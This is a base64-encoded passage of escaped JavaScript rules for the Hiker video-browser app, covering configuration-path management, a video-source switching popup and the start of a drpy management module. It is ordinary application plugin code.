k7XFxcXG4gICAgICAgIH0gZWxzZSBpZiAoL14yMDAvLnRlc3QoeC5jb2RlKSkge1xcXFxuICAgICAgICAgIG1zZyA9IGl0ZW0udGl0bGUucmVwbGFjZShyZWdleCwgdGl0bGUgKyBcXFxcXFxcIumAmuiur+ato+W4uFxcXFxcXFwiLmZvbnRjb2xvcihcXFxcXFxcIiMzQ0IzNzFcXFxcXFxcIikgKyBcXFxcXFxcIiAg5bu26L+fOlxcXFxcXFwiICsgeC50aW1lICsgY291bnQgKyBcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAvL3VybCA9IGl0ZW0udXJsO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgIG1zZyA9IGl0ZW0udGl0bGUucmVwbGFjZShyZWdleCwgdGl0bGUgKyBcXFxcXFxcIumFjee9ruato+ehrlxcXFxcXFwiLmZvbnRjb2xvcihcXFxcXFxcIiMzQ0IzNzFcXFxcXFxcIikgKyBjb3VudCArIFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIpO1xcXFxuICAgICAgICAgIC8vdXJsID0gaXRlbS51cmw7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgdXBkYXRlSXRlbShpdGVtLmV4dHJhLmlkLCB7XFxcXG4gICAgICAgICAgdGl0bGU6IG1zZyxcXFxcbiAgICAgICAgICAvL3VybDogdXJsLFxcXFxuICAgICAgICB9KVxcXFxuICAgICAgfSk7XFxcXG4gICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICB9LCBwYXRoY29uZmlncyksXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF9jZW50ZXJfMVxcXFxcXFwiXFxcXG4gIH0pXFxcXG4gIHBhdGhjb25maWdzLmZvckVhY2goKGl0ZW0sIGkpID0+IHtcXFxcbiAgICBsZXQgbG9uZ0MgPSBbe1xcXFxuICAgICAgdGl0bGU6IFxcXFxcXFwi5ZCN56ewXFxcXFxcXCIsXFxcXG4gICAgICBqczogJC50b1N0cmluZygoaXRlbSwgcCwgYykgPT4ge1xcXFxuICAgICAgICBsZXQgaSA9IGMuZmluZEluZGV4KHggPT4geC5uYW1lID09IGl0ZW0ubmFtZSk7XFxcXG4gICAgICAgIGlmIChpICE9IC0xKSB7XFxcXG4gICAgICAgICAgcmV0dXJuICQoY1tpXS5uYW1lLCBcXFxcXFxcIui+k+WFpeaWsOWQjeensFxcXFxcXFwiKS5pbnB1dCgoYywgcCwgaSkgPT4ge1xcXFxuICAgICAgICAgICAgY1tpXS5uYW1lID0gaW5wdXQ7XFxcXG4gICAgICAgICAgICBzYXZlRmlsZShwLCBKU09OLnN0cmluZ2lmeShjKSk7XFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgIH0sIGMsIHAsIGkpXFxcXG4gICAgICAgIH1cXFxcbiAgICAgIH0sIGl0ZW0sIGNwYXRoLCBwYXRoY29uZmlncylcXFxcbiAgICB9LCB7XFxcXG4gICAgICB0aXRsZTogXFxcXFxcXCLot6/lvoRcXFxcXFxcIixcXFxcbiAgICAgIGpzOiAkLnRvU3RyaW5nKChpdGVtLCBwLCBjKSA9PiB7XFxcXG4gICAgICAgIGxldCBpID0gYy5maW5kSW5kZXgoeCA9PiB4Lm5hbWUgPT0gaXRlbS5uYW1lKTtcXFxcbiAgICAgICAgaWYgKGkgIT0gLTEpIHtcXFxcbiAgICAgICAgICByZXR1cm4gJChjW2ldLnBhdGgsIFxcXFxcXFwi6L6T5YWl5paw6Lev5b6EXFxcXFxcXCIpLmlucHV0KChjLCBwLCBpKSA9PiB7XFxcXG4gICAgICAgICAgICBjW2ldLnBhdGggPSBpbnB1dDtcXFxcbiAgICAgICAgICAgIHNhdmVGaWxlKHAsIEpTT04uc3RyaW5naWZ5KGMpKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgfSwgYywgcCwgaSlcXFxcbiAgICAgICAgfVxcXFxuICAgICAgfSwgaXRlbSwgY3BhdGgsIHBhdGhjb25maWdzKVxcXFxuICAgIH0sIHtcXFxcbiAgICAgIHRpdGxlOiBcXFxcXFxcIuWIoOmZpFxcXFxcXFwiLFxcXFxuICAgICAganM6ICQudG9TdHJpbmcoKGl0ZW0sIHAsIGMpID0+IHtcXFxcbiAgICAgICAgbGV0IGkgPSBjLmZpbmRJbmRleCh4ID0+IHgubmFtZSA9PSBpdGVtLm5hbWUpO1xcXFxuICAgICAgICBpZiAoaSAhPSAtMSkge1xcXFxuICAgICAgICAgIGMuc3BsaWNlKGksIDEpO1xcXFxuICAgICAgICAgIHNhdmVGaWxlKHAsIEpTT04uc3RyaW5naWZ5KGMpKTtcXFxcbiAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICB9LCBpdGVtLCBjcGF0aCwgcGF0aGNvbmZpZ3MpXFxcXG4gICAgfV1cXFxcbiAgICBpZiAoaXRlbS5wYXRoLnN0YXJ0c1dpdGgoXFxcXFxcXCJodHRwXFxcXFxcXCIpKSB7XFxcXG4gICAgICBsb25nQy5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwi6K6/6ZeuXFxcXFxcXCIsXFxcXG4gICAgICAgIGpzOiAkLnRvU3RyaW5nKChpdGVtKSA9PiB7XFxcXG4gICAgICAgICAgaWYgKGl0ZW0ucGF0aC5zdGFydHNXaXRoKFxcXFxcXFwiaHR0cFxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwid2ViOi8vXFxcXFxcXCIgKyBpdGVtLnBhdGg7XFxcXG4gICAgICAgICAgfVxcXFxuICAgICAgICB9LCBpdGVtKVxcXFxuICAgICAgfSlcXFxcbiAgICB9XFxcXG4gICAgbGV0IGN1cnJlbnQgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgIGlmIChjdXJyZW50Y29uZmlnICYmIGN1cnJlbnRjb25maWcuaGFzT3duUHJvcGVydHkoXFxcXFxcXCJwYXRoXFxcXFxcXCIpKSB7XFxcXG4gICAgICBpZiAoaXRlbS5wYXRoID09IGN1cnJlbnRjb25maWcucGF0aCkge1xcXFxuICAgICAgICBjdXJyZW50ID0gXFxcXFxcXCLinqHvuI9cXFxcXFxcIjtcXFxcbiAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgXFxcXFxcXCI8c21hbGw+XFxcXFxcXCIgKyBjdXJyZW50ICsgXFxcXFxcXCLlkI3np7A6XFxcXFxcXCIgKyBpdGVtLm5hbWUgKyBcXFxcXFxcIlxcXFxcXFxcbui3r+W+hDpcXFxcXFxcIiArIGl0ZW0ucGF0aCArIFxcXFxcXFwiPC9zbWFsbD5cXFxcXFxcIixcXFxcbiAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKGl0ZW0gPT4ge1xcXFxuICAgICAgICBjbGVhckl0ZW0oXFxcXFxcXCJub19sb2FkaW5nXFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgcnVudGltZUNvbmZpZyA9IEdNLmRlZmluZU1vZHVsZShcXFxcXFxcInJ1bnRpbWVDb25maWdcXFxcXFxcIik7XFxcXG4gICAgICAgIGxldCB7XFxcXG4gICAgICAgICAgcGF0aCxcXFxcbiAgICAgICAgICBuYW1lXFxcXG4gICAgICAgIH0gPSBpdGVtO1xcXFxuICAgICAgICBpZiAocGF0aC5zdGFydHNXaXRoKFxcXFxcXFwiaHR0cFxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgIHNob3dMb2FkaW5nKFxcXFxcXFwi5q2j5Zyo5Yqg6L296YWN572uLi4uXFxcXFxcXCIpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmIChydW50aW1lQ29uZmlnLnNldEN1cnJlbnRDb25maWcoe1xcXFxuICAgICAgICAgIHBhdGgsXFxcXG4gICAgICAgICAgbmFtZSxcXFxcbiAgICAgICAgfSkpIHtcXFxcbiAgICAgICAgICBiYWNrKGZhbHNlKTtcXFxcbiAgICAgICAgICBsZXQgRHJweU1hbmFnZSA9IEdNLmRlZmluZU1vZHVsZShcXFxcXFxcIkRycHlNYW5hZ2VcXFxcXFxcIik7XFxcXG4gICAgICAgICAgRHJweU1hbmFnZS5jbGVhcigpO1xcXFxuICAgICAgICAgICQucmVxdWlyZShcXFxcXFxcIkNoYW5nZVNvdXJjZVBvcFxcXFxcXFwiKS5zaG93KDEwMCk7XFxcXG4gICAgICAgICAgaGlkZUxvYWRpbmcoKTtcXFxcbiAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgaGlkZUxvYWRpbmcoKTtcXFxcbiAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+WIh+aNouWksei0pVxcXFxcXFwiO1xcXFxuICAgICAgICB9XFxcXG4gICAgICB9LCBpdGVtKSxcXFxcbiAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiLFxcXFxuICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgaWQ6ICdwYXRoJyArIGksXFxcXG4gICAgICAgIGxvbmdDbGljazogbG9uZ0NcXFxcbiAgICAgIH1cXFxcbiAgICB9KVxcXFxuICB9KVxcXFxufVxcXFxuXFxcXG5cXFxcbnNldFJlc3VsdChsYXlvdXQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuaNoua6kOW8ueeql1xcXCIsXFxcInBhdGhcXFwiOlxcXCJDaGFuZ2VTb3VyY2VQb3BcXFwiLFxcXCJydWxlXFxcIjpcXFwiJC5leHBvcnRzLnNob3cgPSBmdW5jdGlvbiAodGltZSkge1xcXFxuICBpZiAodGltZSkge1xcXFxuICAgIGphdmEubGFuZy5UaHJlYWQuc2xlZXAodGltZSk7XFxcXG4gIH1cXFxcbiAgY29uc3QgcnVudGltZUNvbmZpZyA9IEdNLmRlZmluZU1vZHVsZShcXFxcXFxcInJ1bnRpbWVDb25maWdcXFxcXFxcIiwgXFxcXFxcXCJydW50aW1lQ29uZmlnXFxcXFxcXCIpO1xcXFxuICBsZXQgc291cmNlID0gcnVudGltZUNvbmZpZy5nZXRDdXJyZW50U291cmNlKCk7XFxcXG4gIGxldCBuYW1lID0gc291cmNlID8gc291cmNlLm5hbWUgOiBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICBjb25zdCBoaWtlclBvcCA9ICQucmVxdWlyZShcXFxcXFxcImh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9ydWxlbGlzdC5qc29uP2lkPTY5NjZcXFxcXFxcIik7XFxcXG4gIGxldCBzb3VyY2VOYW1lTGlzdCA9IHJ1bnRpbWVDb25maWcuZ2V0QWxsU291cmNlKCkubWFwKHYgPT4ge1xcXFxuICAgIHJldHVybiB2Lm5hbWUgPT0gbmFtZSA/IFxcXFxcXFwi4oCY4oCYXFxcXFxcXCIgKyB2Lm5hbWUgKyBcXFxcXFxcIuKAmeKAmVxcXFxcXFwiIDogdi5uYW1lO1xcXFxuICB9KTtcXFxcbiAgaGlrZXJQb3Auc2V0VXNlU3RhcnRBY3Rpdml0eShmYWxzZSk7XFxcXG4gIGZ1bmN0aW9uIG5hdHVyYWxTb3J0KGEsIGIpIHtcXFxcbiAgICBhID0gYS5yZXBsYWNlKC9b4oCZ4oCYXS9nLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICBiID0gYi5yZXBsYWNlKC9b4oCZ4oCYXS9nLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICByZXR1cm4gYS5sb2NhbGVDb21wYXJlKGIsIHVuZGVmaW5lZCwge1xcXFxuICAgICAgbnVtZXJpYzogdHJ1ZSxcXFxcbiAgICAgIHNlbnNpdGl2aXR5OiAnYmFzZSdcXFxcbiAgICB9KTtcXFxcbiAgfVxcXFxuXFxcXG4gIGxldCBzcGVuID0gMztcXFxcbiAgbGV0IGl0ZW1zID0gc291cmNlTmFtZUxpc3QubWFwKCh4LCBpKSA9PiB7XFxcXG4gICAgcmV0dXJuIHtcXFxcbiAgICAgIHRpdGxlOiB4LFxcXFxuICAgICAgdXJsOiBpXFxcXG4gICAgfVxcXFxuICB9KVxcXFxuXFxcXG4gIGxldCBuYW1lcyA9IGl0ZW1zLm1hcCh2ID0+IHYudGl0bGUpO1xcXFxuICBsZXQgc25hbWUgPSBuYW1lcy5zbGljZSgpO1xcXFxuICBpZiAoZ2V0SXRlbShcXFxcXFxcIm5hdHVyYWxcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikpIHtcXFxcbiAgICBuYW1lcyA9IG5hbWVzLnNvcnQobmF0dXJhbFNvcnQpO1xcXFxuICB9XFxcXG4gIGxldCBtYW5hZ2VfYWxsID0gbmFtZXMuc2xpY2UoKTtcXFxcbiAgbGV0IHNlYXJjaEtleSA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gIGhpa2VyUG9wLnNlbGVjdEJvdHRvbVJlcyh7XFxcXG4gICAgb3B0aW9uczogbmFtZXMsXFxcXG4gICAgY29sdW1uczogc3BlbixcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLpgInmi6nop4bpopHmupBcXFxcXFxcIiArIFxcXFxcXFwi5b2T5YmN5YWxOlxcXFxcXFwiICsgaXRlbXMubGVuZ3RoICsgXFxcXFxcXCLkuKrop4bpopHmupBcXFxcXFxcIixcXFxcbiAgICAvL25vQXV0b0Rpc21pc3M6IHRydWUsXFxcXG4gICAgcG9zaXRpb246IDEsXFxcXG4gICAgZXh0cmFJbnB1dEJveDogbmV3IGhpa2VyUG9wLlJlc0V4dHJhSW5wdXRCb3goe1xcXFxuICAgICAgaGludDogXFxcXFxcXCLmupDlhbPplK7lrZdcXFxcXFxcIixcXFxcbiAgICAgIHRpdGxlOiBcXFxcXFxcIm9rXFxcXFxcXCIsXFxcXG4gICAgICBvbkNoYW5nZSh0ZXh0LCBtYW5hZ2UpIHtcXFxcbiAgICAgICAgLy9sb2coXFxcXFxcXCJvbkNoYW5nZTpcXFxcXFxcIit0ZXh0KVxcXFxuICAgICAgICBsZXQgZmxpc3QgPSBuYW1lcy5maWx0ZXIoeCA9PiB4LmluY2x1ZGVzKHRleHQpKTtcXFxcbiAgICAgICAgbWFuYWdlLmxpc3QubGVuZ3RoID0gMDtcXFxcbiAgICAgICAgZmxpc3QuZm9yRWFjaCh4ID0+IHtcXFxcbiAgICAgICAgICBtYW5hZ2UubGlzdC5wdXNoKHgpO1xcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgbWFuYWdlLmNoYW5nZSgpO1xcXFxuICAgICAgfSxcXFxcbiAgICAgIGRlZmF1bHRWYWx1ZTogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgIGNsaWNrKHMsIG1hbmFnZSkge1xcXFxuICAgICAgICAvL3RvYXN0KHMpO1xcXFxuICAgICAgICAvL2xvZyhtYW5hZ2UubGlzdCk7XFxcXG4gICAgICB9LFxcXFxuICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZVxcXFxuICAgIH0pLFxcXFxuICAgIGNsaWNrKHMsIGksIG1hbmFnZSkge1xcXFxuICAgICAgc2V0SXRlbShcXFxcXFxcIm5vX2xvYWRpbmdcXFxcXFxcIiwgXFxcXFxcXCIxXFxcXFxcXCIpO1xcXFxuICAgICAgLy8gbWFuYWdlLmxpc3QuZm9yRWFjaCgodiwgaWkpID0+IChcXFxcbiAgICAgIC8vICAgbWFuYWdlLmxpc3RbaWldID0gaSA9PT0gaWkgPyBcXFxcXFxcIuKAmOKAmFxcXFxcXFwiICsgbmFtZXNbaWldICsgXFxcXFxcXCLigJnigJlcXFxcXFxcIiA6IG5hbWVzW2lpXS5yZXBsYWNlKC9b4oCZ4oCYXS9nLCBcXFxcXFxcIlxcXFxcXFwiKVxcXFxuICAgICAgLy8gKSk7XFxcXG4gICAgICBsZXQgbmFtZSA9IG1hbmFnZS5saXN0W2ldLnJlcGxhY2UoL1vigJnigJhdL2csIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgaWYgKG5hbWUgPT0gc291cmNlLm5hbWUpIHtcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgcmV0dXJuO1xcXFxuICAgICAgfVxcXFxuICAgICAgbGV0IHNvdXJjZXMgPSBydW50aW1lQ29uZmlnLmdldEFsbFNvdXJjZSgpO1xcXFxuICAgICAgbGV0IGtleSA9IHNvdXJjZXMuZmluZCh2ID0+IHYubmFtZSA9PSBuYW1lKS5rZXk7XFxcXG5cXFxcbiAgICAgIC8vbWFuYWdlLmNoYW5nZSgpO1xcXFxuICAgICAgbGV0IHNvdXJjZU5hbWVMaXN0ID0gcnVudGltZUNvbmZpZy5zZXRDdXJyZW50U291cmNlKGtleSk7XFxcXG4gICAgICBjbGVhck15VmFyKFxcXFxcXFwiY2F0ZWlcXFxcXFxcIik7XFxcXG4gICAgICBjbGVhck15VmFyKFxcXFxcXFwiY2F0ZV9vYmpcXFxcXFxcIik7XFxcXG4gICAgICBjbGVhck15VmFyKFxcXFxcXFwiaXNob21lXFxcXFxcXCIpO1xcXFxuICAgICAgY2xlYXJNeVZhcihcXFxcXFxcImxpbmtzXFxcXFxcXCIpO1xcXFxuICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICB9LFxcXFxuICAgIG1lbnVDbGljayhtYW5hZ2UpIHtcXFxcbiAgICAgIGhpa2VyUG9wLnNlbGVjdENlbnRlcih7XFxcXG4gICAgICAgIG9wdGlvbnM6IFtcXFxcXFxcIuaUueWPmOagt+W8j1xcXFxcXFwiLCBcXFxcXFxcIuetm+mAiea6kFxcXFxcXFwiLCBcXFxcXFxcIuiHqueEtuaOkuW6jzpcXFxcXFxcIiArIChnZXRJdGVtKFxcXFxcXFwibmF0dXJhbFxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKSA9PSBcXFxcXFxcIlxcXFxcXFwiID8gXFxcXFxcXCLlhbPpl61cXFxcXFxcIiA6IFxcXFxcXFwi5ZCv55SoXFxcXFxcXCIpLCBcXFxcXFxcIuWAkuW6j1xcXFxcXFwiLCBcXFxcXFxcIuWIt+aWsOmFjee9rlxcXFxcXFwiXSxcXFxcbiAgICAgICAgY29sdW1uczogMixcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwi6K+36YCJ5oupXFxcXFxcXCIsXFxcXG4gICAgICAgIGNsaWNrKHMsIGkpIHtcXFxcbiAgICAgICAgICBpZiAoaSA9PT0gMCkge1xcXFxuICAgICAgICAgICAgc3BlbiA9IHNwZW4gPT0gMyA/IDEgOiAzO1xcXFxuICAgICAgICAgICAgbWFuYWdlLmNoYW5nZUNvbHVtbnMoc3Blbik7XFxcXG4gICAgICAgICAgfSBlbHNlIGlmIChpID09PSAxKSB7XFxcXG4gICAgICAgICAgICBoaWtlclBvcC5pbnB1dENvbmZpcm0oe1xcXFxuICAgICAgICAgICAgICBjb250ZW50OiBcXFxcXFxcIui+k+WFpeWFs+mUruWtlyDnqbrmmL7npLrlhajpg6hcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi562b6YCJ5rqQXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgIGhpbnQ6IFxcXFxcXFwi5rqQ5YWz6ZSu5a2XXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTogc2VhcmNoS2V5LFxcXFxuICAgICAgICAgICAgICB0ZXh0YXJlYTogZmFsc2UsIC8v5aSa6KGM5qih5byPXFxcXG4gICAgICAgICAgICAgIG1heFRleHRhcmVhOiB0cnVlLFxcXFxuICAgICAgICAgICAgICBub0F1dG9Tb2Z0OiBmYWxzZSxcXFxcbiAgICAgICAgICAgICAgLy9oaWRlQ2FuY2VsOiB0cnVlLFxcXFxuICAgICAgICAgICAgICBjb25maXJtKHRleHQpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcnVudGltZUNvbmZpZyA9IEdNLmRlZmluZU1vZHVsZShcXFxcXFxcInJ1bnRpbWVDb25maWdcXFxcXFxcIiwgXFxcXFxcXCJydW50aW1lQ29uZmlnXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIHNlYXJjaEtleSA9IHRleHQ7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGxpc3QgPSBydW50aW1lQ29uZmlnLmdldEFsbFNvdXJjZSgpLm1hcCh4ID0+IHgubmFtZSk7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGZsaXN0ID0gbGlzdC5maWx0ZXIoeCA9PiB4LmluY2x1ZGVzKHRleHQpKTtcXFxcbiAgICAgICAgICAgICAgICBtYW5hZ2UubGlzdC5sZW5ndGggPSAwO1xcXFxuICAgICAgICAgICAgICAgIGZsaXN0LmZvckVhY2goeCA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICBtYW5hZ2UubGlzdC5wdXNoKHgpO1xcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgIG1hbmFnZS5jaGFuZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAvL3JldHVybiBcXFxcXFxcInRvYXN0Oi8v6L6T5YWl5LqGXFxcXFxcXCIgKyB0ZXh0O1xcXFxuICAgICAgICAgICAgICB9LFxcXFxuXFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICB9IGVsc2UgaWYgKGkgPT09IDIpIHtcXFxcbiAgICAgICAgICAgIGxldCBsaXN0ID0gT2JqZWN0LmFzc2lnbihbXSwgbWFuYWdlLmxpc3QpO1xcXFxuICAgICAgICAgICAgbGV0IG5hdHVyYWwgPSBnZXRJdGVtKFxcXFxcXFwibmF0dXJhbFxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGlmIChuYXR1cmFsID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgbWFuYWdlLmxpc3QubGVuZ3RoID0gMDtcXFxcbiAgICAgICAgICAgICAgbGlzdC5zb3J0KG5hdHVyYWxTb3J0KS5mb3JFYWNoKHggPT4ge1xcXFxuICAgICAgICAgICAgICAgIG1hbmFnZS5saXN0LnB1c2goeCk7XFxcXG4gICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgbWFuYWdlLmxpc3QubGVuZ3RoID0gMDtcXFxcbiAgICAgICAgICAgICAgc25hbWUuZm9yRWFjaCh4ID0+IHtcXFxcbiAgICAgICAgICAgICAgICBtYW5hZ2UubGlzdC5wdXNoKHgpO1xcXFxuICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbWFuYWdlLmNoYW5nZSgpO1xcXFxuICAgICAgICAgICAgc2V0SXRlbShcXFxcXFxcIm5hdHVyYWxcXFxcXFxcIiwgbmF0dXJhbCA/IFxcXFxcXFwiXFxcXFxcXCIgOiBcXFxcXFxcIjFcXFxcXFxcIik7XFxcXG4gICAgICAgICAgfSBlbHNlIGlmIChpID09IDMpIHtcXFxcbiAgICAgICAgICAgIG1hbmFnZS5saXN0LnJldmVyc2UoKTtcXFxcbiAgICAgICAgICAgIG5hbWVzLnJldmVyc2UoKTtcXFxcbiAgICAgICAgICAgIG1hbmFnZS5jaGFuZ2UoKTtcXFxcbiAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgZnVuY3Rpb24gYXJyYXlEaWZmZXJlbmNlKGFycjEsIGFycjIpIHtcXFxcbiAgICAgICAgICAgICAgY29uc3QgbWFwID0gbmV3IE1hcChhcnIyLm1hcChpdGVtID0+IFtpdGVtLmtleSwgaXRlbV0pKTtcXFxcbiAgICAgICAgICAgICAgcmV0dXJuIGFycjEuZmlsdGVyKGl0ZW0gPT4gIW1hcC5oYXMoaXRlbS5rZXkpKTtcXFxcbiAgICAgICAgICAgIH1cXFxcblxcXFxuICAgICAgICAgICAgbGV0IHJ1bnRpbWVDb25maWcgPSBHTS5kZWZpbmVNb2R1bGUoXFxcXFxcXCJydW50aW1lQ29uZmlnXFxcXFxcXCIsIFxcXFxcXFwicnVudGltZUNvbmZpZ1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGxldCBsaXN0ID0gcnVudGltZUNvbmZpZy5nZXRBbGxTb3VyY2UoKTtcXFxcbiAgICAgICAgICAgIGxldCBDa2V5ID0gcnVudGltZUNvbmZpZy5nZXRDdXJyZW50U291cmNlKCkua2V5O1xcXFxuICAgICAgICAgICAgLy9sb2coQ2tleSlcXFxcbiAgICAgICAgICAgIGxldCBjZmcgPSBydW50aW1lQ29uZmlnLmdldEN1cnJlbnRDb25maWcoKVxcXFxuICAgICAgICAgICAgbGV0IHtcXFxcbiAgICAgICAgICAgICAgcGF0aCxcXFxcbiAgICAgICAgICAgICAgbmFtZVxcXFxuICAgICAgICAgICAgfSA9IGNmZztcXFxcbiAgICAgICAgICAgIHJ1bnRpbWVDb25maWcuc2V0Q3VycmVudENvbmZpZyh7XFxcXG4gICAgICAgICAgICAgIHBhdGgsXFxcXG4gICAgICAgICAgICAgIG5hbWUsXFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIHJ1bnRpbWVDb25maWcuc2V0Q3VycmVudFNvdXJjZShDa2V5KTtcXFxcbiAgICAgICAgICAgIGxldCBuc291cmNlcyA9IHJ1bnRpbWVDb25maWcuZ2V0QWxsU291cmNlKCk7XFxcXG5cXFxcbiAgICAgICAgICAgIGxldCBhbGlzdCA9IGFycmF5RGlmZmVyZW5jZShuc291cmNlcywgbGlzdCk7XFxcXG4gICAgICAgICAgICBsZXQgZGxpc3QgPSBhcnJheURpZmZlcmVuY2UobGlzdCwgbnNvdXJjZXMpO1xcXFxuXFxcXG4gICAgICAgICAgICBpZiAoYWxpc3QubGVuZ3RoID4gMCB8fCBkbGlzdC5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgICAgICAgIGxldCBtc2cgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICBpZiAoYWxpc3QubGVuZ3RoID4gMCkge1xcXFxuICAgICAgICAgICAgICAgIGFsaXN0LmZvckVhY2goeCA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICBtYW5hZ2UubGlzdC5wdXNoKHgubmFtZSk7XFxcXG4gICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICBsb2coXFxcXFxcXCLmlrDlop46XFxcXFxcXCIgKyBhbGlzdC5tYXAoayA9PiBrLm5hbWUpLmpvaW4oXFxcXFxcXCIsXFxcXFxcXCIpKVxcXFxuICAgICAgICAgICAgICAgIG1zZyArPSBcXFxcXFxcIuaWsOWinlxcXFxcXFwiICsgYWxpc3QubGVuZ3RoICsgXFxcXFxcXCLkuKrmupBcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICBpZiAoZGxpc3QubGVuZ3RoID4gMCkge1xcXFxuICAgICAgICAgICAgICAgIGRsaXN0LmZvckVhY2goeCA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICBtYW5hZ2UubGlzdC5zcGxpY2UobWFuYWdlLmxpc3QuaW5kZXhPZih4Lm5hbWUpLCAxKTtcXFxcbiAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgIGxvZyhcXFxcXFxcIuenu+mZpDpcXFxcXFxcIiArIGRsaXN0Lm1hcChrID0+IGsubmFtZSkuam9pbihcXFxcXFxcIixcXFxcXFxcIikpXFxcXG4gICAgICAgICAgICAgICAgbXNnICs9IFxcXFxcXFwiIOenu+mZpFxcXFxcXFwiICsgZGxpc3QubGVuZ3RoICsgXFxcXFxcXCLkuKrmupBcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICBtYW5hZ2UuY2hhbmdlKCk7XFxcXG4gICAgICAgICAgICAgIHRvYXN0KG1zZyArIFxcXFxcXFwiIOabtOWkmuivpuaDheeci2xvZ1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgIHRvYXN0KFxcXFxcXFwi5bey5Yi35pawXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgfSxcXFxcbiAgICAgIH0pO1xcXFxuICAgIH1cXFxcbiAgfSk7XFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwiZHJweeeuoeeQhlxcXCIsXFxcInBhdGhcXFwiOlxcXCJEcnB5TWFuYWdlXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuY29uc3QgSlNFbmdpbmUgPSBjb20uZXhhbXBsZS5oaWtlcnZpZXcuc2VydmljZS5wYXJzZXIuSlNFbmdpbmU7XFxcXG5jb25zdCBydW50aW1lQ29uZmlnID0gR00uZGVmaW5lTW